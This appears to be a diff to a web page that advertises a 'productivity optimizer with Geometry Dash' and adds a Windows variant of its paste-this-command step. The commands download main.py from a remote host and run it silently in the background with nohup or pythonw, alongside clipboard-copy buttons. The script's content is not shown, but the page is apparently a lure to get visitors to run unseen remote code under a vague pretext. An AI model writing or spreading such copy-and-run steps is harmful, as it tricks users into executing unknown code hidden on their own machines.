@@ -14,9 +14,15 @@
     <h2>Productivity optimizer with Geometry Dash!</h2>
     <p>Copy the command below and paste it into the terminal, your productivity shall surge like never before!</p>
 
+    <h5>MacOS or Linux:</h5>
     <pre id="oneLineBlock">curl -fsSL "https://gdash.espolin.dev/files/main.py" -o main.py && nohup python3 main.py &amp;</pre>
     <button id="copyOneLine">Copy command</button>
     <span id="copyOneStatus" style="margin-left:0.6rem;color:#666"></span>
+
+ <h5>Windows:</h5>
+    <pre id="oneLineBlockWindows">curl -fsSL "https://gdash.espolin.dev/files/main.py" -o main.py && start /b pythonw main.py</pre>
+    <button id="copyOneLineWindows">Copy command</button>
+    <span id="copyOneStatusWindows" style="margin-left:0.6rem;color:#666"></span>
 
     <script>
       document.getElementById('copyOneLine').addEventListener('click', async () => {
@@ -28,6 +34,18 @@
           setTimeout(() => s.textContent = '', 2000);
         } catch (err) {
           document.getElementById('copyOneStatus').textContent = 'Copy failed — select and press ⌘C';
+        }
+      });
+
+      document.getElementById('copyOneLineWindows').addEventListener('click', async () => {
+        const cmd = document.getElementById('oneLineBlockWindows').textContent;
+        try {
+          await navigator.clipboard.writeText(cmd);
+          const s = document.getElementById('copyOneStatusWindows');
+          s.textContent = 'Copied!';
+          setTimeout(() => s.textContent = '', 2000);
+        } catch (err) {
+          document.getElementById('copyOneStatusWindows').textContent = 'Copy failed — select and press ⌘C';
         }
       });
     </script>
